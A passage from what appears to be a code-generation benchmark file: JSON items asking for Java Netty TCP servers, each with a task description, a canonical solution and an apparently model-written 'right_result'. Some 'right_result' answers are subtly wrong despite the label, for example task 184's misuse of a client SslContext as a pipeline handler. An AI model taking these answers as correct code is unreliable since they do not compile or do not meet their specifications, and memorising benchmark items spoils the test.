ch.pipeline().addLast(\"encoder\", new HttpResponseEncoder());\n                            ch.pipeline().addLast(\"chunkedWriter\", new ChunkedWriteHandler());\n                            ch.pipeline().addLast(new SimpleHttpServerHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);\n\n            channel = bootstrap.bind(port).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            if (channel != null && !channel.isOpen()) {\n                shutdown();\n            }\n        }\n    }\n\n    public void shutdown() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    private static class SimpleHttpServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            // Implement HTTP request handling logic here\n            ctx.writeAndFlush(msg); // Echo response for example purposes\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 182,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to echo back any received messages to clients.\n\nClass Description: The EchoServer class is a Netty-based TCP server that listens on a specified port and echoes back any data received from connected clients. It manages server lifecycle including startup, shutdown, and resource cleanup.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and distributes them to workerGroup\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for established connections\n- bootstrap: [ServerBootstrap] - Netty server configuration and management object\n- DEFAULT_PORT: [int] - Default port number (7) to use when no port is specified\n\nMethods:\n- EchoServer() -> [void] - Constructor that initializes bossGroup, workerGroup and bootstrap\n- start([int port]) -> [void] - Starts the server on specified port, configures channel pipeline and binds to port\n- shutdown() -> [void] - Gracefully shuts down the server and releases all resources\n- main([String[] args]) -> [void] - Entry point that parses command line arguments and starts the server",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws InterruptedException {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new EchoServerHandler())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"EchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class EchoServer {\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final ServerBootstrap bootstrap = new ServerBootstrap();\n    private static final int DEFAULT_PORT = 7;\n\n    public EchoServer() {}\n\n    public void start(int port) throws Exception {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new EchoServerHandler());\n                    }\n                });\n\n        ChannelFuture f = bootstrap.bind(port).sync();\n        f.channel().closeFuture().sync();\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = (args.length > 0) ? Integer.parseInt(args[0]) : DEFAULT_PORT;\n        try {\n            EchoServer echoServer = new EchoServer();\n            echoServer.start(port);\n        } finally {\n            System.out.println(\"Shutting down server...\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 183,
    "Instruction": "Task Description: Create a Java class that implements a secure TCP chat server using Netty framework, supporting SSL/TLS encryption for secure communication between clients and the server.\n\nClass Description: SecureChatServer is a Netty-based TCP server that listens for incoming client connections on a specified port, establishes secure SSL/TLS encrypted channels, and handles chat communication. The server uses a boss-worker thread model for efficient connection handling.\n\nAttributes:\nPORT: [static final int] - The port number on which the server listens for incoming connections, defaulting to 8992 if not specified via system property.\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the secure chat server. Creates a self-signed SSL certificate, configures Netty's event loop groups, sets up server bootstrap with SSL context and channel handlers, binds to the specified port, and maintains server operation until shutdown. Handles resource cleanup during shutdown.\n- Throws: Exception if any error occurs during server startup or operation",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class SecureChatServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public void start() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SecureChatServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class SecureChatServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public void start() throws Exception {\n        final SelfSignedCertificate ssc = new SelfSignedCertificate();\n        final SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                     ch.pipeline().addLast(new StringDecoder());\n                     ch.pipeline().addLast(new StringEncoder());\n                     ch.pipeline().addLast(new SecureChatServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            System.out.println(\"Secure Chat Server started on port \" + PORT);\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        new SecureChatServer().start();\n    }\n}\n```"
  },
  {
    "Task_id": 184,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and echo back received messages. The server should support optional SSL encryption and be configurable via system properties.\n\nClass Description: EchoServer is a Netty-based TCP server that listens for incoming connections on a specified port and echoes back any received data. It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be enabled (configured via system property \"ssl\")\n- PORT: int - The port number on which the server will listen (configured via system property \"port\", defaults to 8007)\n\nMethods:\n- start(): void - Starts the Netty TCP server, configures SSL if enabled, sets up event loop groups, and binds to the specified port. Throws Exception if any error occurs during startup.\n  - Input: None\n  - Output: None (void)\n  - Description: Initializes the server with boss and worker event loop groups, configures the server bootstrap with channel options and handlers, and starts listening for incoming connections. The method blocks until the server channel is closed.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class EchoServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        final EchoServerHandler serverHandler = new EchoServerHandler();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(serverHandler);\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class EchoServer {\n\n    private final boolean SSL;\n    private final int PORT;\n\n    public EchoServer() {\n        this.SSL = Boolean.parseBoolean(System.getProperty(\"ssl\", \"false\"));\n        this.PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     if (SSL) {\n                         ch.pipeline().addLast(SslContextBuilder.forClient().build());\n                     }\n                     ch.pipeline().addLast(new EchoServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            if (SSL) {\n                SelfSignedCertificate ssc = new SelfSignedCertificate();\n                SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n                b.childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                        ch.pipeline().addLast(new EchoServerHandler());\n                    }\n                });\n            }\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 185,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process TCP requests.\n\nClass Description: The AndroidControlServer class is a Netty-based TCP server that listens on a specified port, accepts incoming client connections, and processes TCP requests using a custom handler. It manages server resources and provides graceful shutdown capabilities.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Processes the accepted connections' network traffic\n\nMethods:\n- listen: [listen(int port)] -> [void] - Starts the TCP server on the specified port, configures server options, and sets up the request handler pipeline. The method blocks until the server channel is closed.\n  - Input Parameters:\n    - port: [int] - The port number on which the server should listen\n  - Throws:\n    - InterruptedException - If the thread is interrupted while waiting for the server to shutdown",
    "Canonical_solution": "import com.yeetor.server.handler.TCPHandler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class AndroidControlServer {\n\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n    public void listen(int port) throws InterruptedException {\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(\"tcp\", new TCPHandler());\n                        }\n                    });\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class AndroidControlServer {\n\n    private final int port;\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n    public AndroidControlServer(int port) {\n        this.port = port;\n    }\n\n    public void listen() throws InterruptedException {\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new AndroidControlHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 187,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process time-related requests.\n\nClass Description: The TimeServer class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses Netty's event-driven architecture to efficiently handle multiple concurrent connections. The server processes incoming requests through a pipeline of handlers and responds with time-related information.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nconstructor: TimeServer(int port) -> void - Initializes the server with the specified port number\nrun: run() -> void - Starts the server, binds it to the specified port, and begins accepting client connections. This method handles the server's lifecycle including startup, operation, and graceful shutdown. Throws Exception if any error occurs during server operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class TimeServer {\n\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeEncoder());\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class TimeServer {\n    private final int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ch.pipeline().addLast(new LengthFieldBasedFrameDecoder(1024, 0, 4, 0, 4));\n                     ch.pipeline().addLast(new StringDecoder());\n                     ch.pipeline().addLast(new LengthFieldPrepender(4));\n                     ch.pipeline().addLast(new StringEncoder());\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 188,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process their requests.\n\nClass Description: The MyServer class represents a Netty-based TCP server that listens on a specified port, accepts client connections, and processes incoming data through a configured pipeline of handlers.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nMyServer: [constructor](int port) -> void - Initializes the server with the specified port number\nrun: [method]() throws Exception -> void - Starts the server, binds to the configured port, and begins accepting client connections. Sets up the server bootstrap with worker threads, channel type, and handler pipeline. Includes proper resource cleanup on shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class MyServer {\n\n    private int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(\"logging\", new LoggingHandler(LogLevel.INFO));\n                     ch.pipeline().addLast(\"codec\", new MyCodec());\n                     ch.pipeline().addLast(new MyServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start listen at \" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyServer {\n    private final int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new MyServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 189,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling telnet connections with optional SSL encryption.\n\nClass Description: The TelnetServer class is a Netty-based TCP server implementation that listens for incoming telnet connections. It supports optional SSL encryption and provides graceful shutdown capabilities. The server uses a boss-worker thread model for handling connections efficiently.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n\nMethods:\n- start(): [void] throws [Exception] - Initializes and starts the TCP server. Configures SSL if enabled, sets up event loop groups, and binds to the specified port. The method blocks until the server is shut down.\n  - Input: None\n  - Output: None (but may throw exceptions during server setup or operation)\n  - Side effects: Starts a TCP server that listens for incoming connections and processes them using the configured pipeline handlers",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class TelnetServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new TelnetServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class TelnetServer {\n    private final boolean SSL;\n    private final int PORT;\n\n    public TelnetServer(boolean ssl, int port) {\n        this.SSL = ssl;\n        this.PORT = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     if (SSL) {\n                         ch.pipeline().addLast(\"ssl\", sslContext().newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new LineBasedFrameDecoder(8192));\n                     ch.pipeline().addLast(new StringDecoder());\n                     ch.pipeline().addLast(new StringEncoder());\n                     ch.pipeline().addLast(new TelnetServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private SslContext sslContext() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        return SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n    }\n}\n```"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket chat server using Netty framework to handle TCP connections and manage client communications.\n\nClass Description: The WebSocketChatServer class is responsible for setting up and running a Netty-based TCP server that handles WebSocket connections for chat functionality. It manages server resources and gracefully shuts down when needed.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nWebSocketChatServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() throws Exception -> None - Starts the server, binds it to the specified port, and keeps it running until shutdown is requested. Manages server resources and ensures proper cleanup.",
